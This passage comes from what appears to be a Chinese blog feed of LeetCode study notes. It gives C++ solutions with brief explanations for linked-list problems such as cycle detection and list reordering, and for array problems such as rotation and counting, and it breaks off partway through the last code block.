class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">partition</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> x)</span> </span>&#123;<br>        ListNode* small = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<br>        ListNode* smallHead = small;<br>        ListNode* large = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<br>        ListNode* largeHead = large;<br>        <span class="hljs-keyword">while</span> (head != <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">if</span> (head-&gt;val &lt; x) &#123;<br>                small-&gt;next = head;<br>                small = small-&gt;next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                large-&gt;next = head;<br>                large = large-&gt;next;<br>            &#125;<br>            head = head-&gt;next;<br>        &#125;<br>        large-&gt;next = <span class="hljs-literal">nullptr</span>;<br>        small-&gt;next = largeHead-&gt;next;<br>        <span class="hljs-keyword">return</span> smallHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="环形链表">环形链表</h2><blockquote><p>法一：将遍历过的节点值设为原本不可能出现的值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (head) &#123;<br>            <span class="hljs-keyword">if</span> (head-&gt;val == INT_MIN) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            head-&gt;val = INT_MIN;<br>            head = head-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：「Floyd判圈算法」（又称龟兔赛跑算法）：假想「乌龟」和「兔子」在链表上移动，「兔子」跑得快，「乌龟」跑得慢。当「乌龟」和「兔子」从链表上的同一个节点开始移动时，如果该链表中没有环，那么「兔子」将一直处于「乌龟」的前方；如果该链表中有环，那么「兔子」会先于「乌龟」进入环，并且一直在环内移动。等到「乌龟」进入环时，由于「兔子」的速度快，它一定会在某个时刻与乌龟相遇，即套了「乌龟」若干圈。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head || !head-&gt;next) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        ListNode* fast = head;<br>        ListNode* slow = head;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!fast || !fast-&gt;next) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            fast = fast-&gt;next-&gt;next;<br>            slow = slow-&gt;next;<br>            <span class="hljs-keyword">if</span> (fast == slow) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="环形链表ii">环形链表II</h2><blockquote><p>设链表共有 a+b 个节点，其中链表头部到链表入口有 a个节点（不计链表入口节点）， 链表环有 b 个节点；设两指针分别走了 f，s步。根据：</p><ol type="1"><li><code>f = 2s</code>（快指针每次2步，路程刚好2倍）</li><li><code>f = s + nb</code> (相遇时，刚好多走了n圈）</li></ol><p>推出：<code>s = nb</code></p><p>从head结点走到入环点需要走 ： a + nb，而slow已经走了nb，那么slow再走a步就是入环点了。如何知道slow刚好走了a步？从head开始，和slow指针一起走，相遇时刚好就是a步。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head || !head-&gt;next) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        ListNode* fast = head;<br>        ListNode* slow = head;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!fast || !fast-&gt;next) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            fast = fast-&gt;next-&gt;next;<br>            slow = slow-&gt;next;<br>            <span class="hljs-keyword">if</span> (fast == slow) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        fast = head;<br>        <span class="hljs-keyword">while</span> (fast != slow) &#123;<br>            fast = fast-&gt;next;<br>            slow = slow-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> fast;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="链表的中间结点">链表的中间结点</h2><blockquote><p>快慢指针。用两个指针 <code>slow</code> 与 <code>fast</code>一起遍历链表。<code>slow</code> 一次走一步，<code>fast</code>一次走两步。那么当 <code>fast</code> 到达链表的末尾时，<code>slow</code>必然位于中间。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">middleNode</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* fast = head;<br>        ListNode* slow = head;<br>        <span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slow;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="重排链表">重排链表</h2><blockquote><p>法一：利用线性表存储该链表，然后利用线性表可以下标访问的特点，直接按顺序访问指定元素，重建该链表即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reorderList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        vector&lt;ListNode*&gt; vec;<br>        ListNode* node = head;<br>        <span class="hljs-keyword">while</span> (node) &#123;<br>            vec.<span class="hljs-built_in">push_back</span>(node);<br>            node = node-&gt;next;<br>        &#125;<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = vec.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; j) &#123;<br>            vec[i]-&gt;next = vec[j];<br>            i++;<br>            <span class="hljs-keyword">if</span> (i == j) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            vec[j]-&gt;next = vec[i];<br>            j--;<br>        &#125;<br>        vec[i]-&gt;next = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：寻找链表中点 + 链表逆序 + 合并链表</p><p>1 -&gt; 2 -&gt; 3 -&gt; 4 -&gt; 5 -&gt; 6第一步，将链表平均分成两半(此步骤代码与前面略有调整) 1 -&gt; 2 -&gt; 3 4-&gt; 5 -&gt; 6</p><p>第二步，将第二个链表逆序 1 -&gt; 2 -&gt; 3 6 -&gt; 5 -&gt; 4</p><p>第三步，依次连接两个链表 1 -&gt; 6 -&gt; 2 -&gt; 5 -&gt; 3 -&gt;4</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reorderList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        ListNode* mid = <span class="hljs-built_in">middleNode</span>(head);<br>        ListNode* l1 = head;<br>        ListNode* l2 = mid-&gt;next;<br>        mid-&gt;next = <span class="hljs-literal">nullptr</span>;<br>        l2 = <span class="hljs-built_in">reverseList</span>(l2);<br>        <span class="hljs-built_in">mergeList</span>(l1, l2);<br>    &#125;<br><br>    <span class="hljs-function">ListNode* <span class="hljs-title">middleNode</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span> (fast-&gt;next != <span class="hljs-literal">nullptr</span> &amp;&amp; fast-&gt;next-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slow;<br>    &#125;<br><br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* prev = <span class="hljs-literal">nullptr</span>;<br>        ListNode* curr = head;<br>        <span class="hljs-keyword">while</span> (curr != <span class="hljs-literal">nullptr</span>) &#123;<br>            ListNode* nextTemp = curr-&gt;next;<br>            curr-&gt;next = prev;<br>            prev = curr;<br>            curr = nextTemp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mergeList</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        ListNode* l1_tmp;<br>        ListNode* l2_tmp;<br>        <span class="hljs-keyword">while</span> (l1 != <span class="hljs-literal">nullptr</span> &amp;&amp; l2 != <span class="hljs-literal">nullptr</span>) &#123;<br>            l1_tmp = l1-&gt;next;<br>            l2_tmp = l2-&gt;next;<br><br>            l1-&gt;next = l2;<br>            l1 = l1_tmp;<br><br>            l2-&gt;next = l1;<br>            l2 = l2_tmp;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="相交链表">相交链表</h2><blockquote><p>法一：二重循环。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        ListNode* currA=headA;<br>        <span class="hljs-keyword">while</span>(currA)&#123;<br>            ListNode* currB=headB;<br>            <span class="hljs-keyword">while</span>(currB)&#123;<br>                <span class="hljs-keyword">if</span>(currB==currA)&#123;<br>                    <span class="hljs-keyword">return</span> currB;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    currB=currB-&gt;next;<br>                &#125;<br>            &#125;<br>            currA=currA-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：pA和pB走过的长度都相同，都是A链和B链的长度之和，相当于将两条链从尾端对齐，如果相交，则会提前在相交点相遇，如果没有相交点，则会在最后相遇，即为NULL。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (headA == <span class="hljs-literal">nullptr</span> || headB == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        ListNode *pA = headA, *pB = headB;<br>        <span class="hljs-keyword">while</span> (pA != pB) &#123;<br>            pA = pA == <span class="hljs-literal">nullptr</span> ? headB : pA-&gt;next;<br>            pB = pB == <span class="hljs-literal">nullptr</span> ? headA : pB-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> pA;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数组篇</title>
    <link href="/2024/03/11/LeetCode/%E6%95%B0%E7%BB%84%E7%AF%87/"/>
    <url>/2024/03/11/LeetCode/%E6%95%B0%E7%BB%84%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="数组的改变移动">1.数组的改变、移动</h1><h2 id="最小操作次数使数组元素相等">最小操作次数使数组元素相等</h2><blockquote><p>每次操作既可以理解为使 n−1 个元素增加 1，也可以理解使 1 个元素减少1。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minMoves</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> min = INT_MAX;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> num:nums)&#123;<br>            <span class="hljs-keyword">if</span>(num&lt;min)&#123;<br>                min=num;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> num:nums)&#123;<br>            res+=num-min;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="非递减数列">非递减数列</h2><blockquote><p>遍历数组，如果遇到递减：</p><ul><li>还能修改：修改方案1：将nums[i]缩小至nums[i + 1]；修改方案2：将nums[i+ 1]放大至nums[i]；</li><li>不能修改：直接返回false。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checkPossibility</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-type">bool</span> flag = (nums[<span class="hljs-number">0</span>] &gt; nums[<span class="hljs-number">1</span>]) ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; nums[i + <span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-keyword">if</span> (flag) &#123;<br>                    <span class="hljs-keyword">if</span> (nums[i + <span class="hljs-number">1</span>] &gt;= nums[i - <span class="hljs-number">1</span>]) &#123;<br>                        nums[i] = nums[i + <span class="hljs-number">1</span>];<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        nums[i + <span class="hljs-number">1</span>] = nums[i];<br>                    &#125;<br>                    flag = <span class="hljs-literal">false</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="移动零">移动零</h2><blockquote><p>类似快慢指针</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] != <span class="hljs-number">0</span>) &#123;<br>                nums[index] = nums[i];<br>                index++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = index; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            nums[i] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="数组的旋转">2.数组的旋转</h1><h2 id="轮转数组">轮转数组</h2><blockquote><p>用 n 表示数组的长度，我们遍历原数组，将原数组下标为 i的元素放至新数组下标为 (i+k)mod n的位置，最后将新数组拷贝至原数组即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rotate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">newArr</span><span class="hljs-params">(n)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            newArr[(i + k) % n] = nums[i];<br>        &#125;<br>        nums.<span class="hljs-built_in">assign</span>(newArr.<span class="hljs-built_in">begin</span>(), newArr.<span class="hljs-built_in">end</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="旋转函数">旋转函数</h2><blockquote><p>数学公式递推：错位相减，得<spanclass="math inline">\(F(k)=F(k−1)+numSum−n×nums[n−k]\)</span>。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxRotateFunction</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> f = <span class="hljs-number">0</span>, sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> numsSize = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numsSize; i++) &#123;<br>            f += i * nums[i];<br>            sum += nums[i];<br>        &#125;<br>        <span class="hljs-type">int</span> maxF = f;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; numsSize; i++) &#123;<br>            f += sum - numsSize * nums[numsSize - i];<br>            maxF = (f &gt; maxF) ? f : maxF;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxF;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="统计数组中的元素">3.统计数组中的元素</h1><h2 id="错误的集合">错误的集合</h2><blockquote><p>重复的数字在数组中出现 2 次，丢失的数字在数组中出现 0次，其余的每个数字在数组中出现 1次。记录每个元素在数组中出现的次数，然后遍历从 1 到 n的每个数字，分别找到出现 2 次和出现 0次的数字，即为重复的数字和丢失的数字。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findErrorNums</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">counts</span><span class="hljs-params">(nums.size() + <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            counts[nums[i]]++;<br>        &#125;<br>        <span class="hljs-comment">// 从1至n遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (counts[i] == <span class="hljs-number">2</span>) &#123;<br>                res[<span class="hljs-number">0</span>] = i;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (counts[i] == <span class="hljs-number">0</span>) &#123;<br>                res[<span class="hljs-number">1</span>] = i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="数组的度">数组的度</h2><blockquote><p>使用哈希表将每一个数映射到一个长度为 3的数组，数组中的三个元素分别代表这个数出现的次数、这个数在原数组中第一次出现的位置和这个数在原数组中最后一次出现的位置。当我们记录完所有信息后，我们需要遍历该哈希表，找到元素出现次数最多，且前后位置差最小的数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 